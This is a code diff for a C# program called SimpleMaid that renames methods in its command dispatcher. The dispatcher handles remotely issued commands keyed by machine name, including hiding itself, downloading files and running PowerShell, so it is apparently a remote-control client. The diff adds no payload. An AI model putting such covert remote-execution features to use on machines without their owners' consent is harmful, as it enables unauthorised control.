@@ -288,27 +288,27 @@ namespace SimpleMaid
           {
             case Variables.QuitCommand:
               SetUntilSet($"commands.{MainConfig.MachineName}", ans + Variables.GeneralOkMsg);
-              exitCommand();
+              ExitCommand();
               break;
 
             case Variables.HideCommand:
-              SetUntilSet($"commands.{MainConfig.MachineName}", ans + hideCommand());
+              SetUntilSet($"commands.{MainConfig.MachineName}", ans + HideCommand());
               break;
 
             case Variables.ShowCommand:
-              SetUntilSet($"commands.{MainConfig.MachineName}", ans + showCommand());
+              SetUntilSet($"commands.{MainConfig.MachineName}", ans + ShowCommand());
               break;
 
             case Variables.DownloadCommand:
-              SetUntilSet($"commands.{MainConfig.MachineName}", ans + downloadCommand(commandParts));
+              SetUntilSet($"commands.{MainConfig.MachineName}", ans + DownloadCommand(commandParts));
               break;
 
             case Variables.MessageCommand:
-              SetUntilSet($"commands.{MainConfig.MachineName}", ans + messageCommand(commandParts));
+              SetUntilSet($"commands.{MainConfig.MachineName}", ans + MessageCommand(commandParts));
               break;
 
             case Variables.PowershellCommand:
-              SetUntilSet($"commands.{MainConfig.MachineName}", ans + powershellCommand(commandParts));
+              SetUntilSet($"commands.{MainConfig.MachineName}", ans + PowershellCommand(commandParts));
               break;
 
             case Variables.RepeatCommand:
@@ -341,11 +341,11 @@ namespace SimpleMaid
                 switch (specialRepeatCommandIdentifier)
                 {
                   case Variables.QuitCommand:
-                    exitCommand();
+                    ExitCommand();
                     break;
 
                   case Variables.PowershellCommand:
-                    powershellCommand(repeatCommandParts);
+                    PowershellCommand(repeatCommandParts);
                     break;
 
                   default:
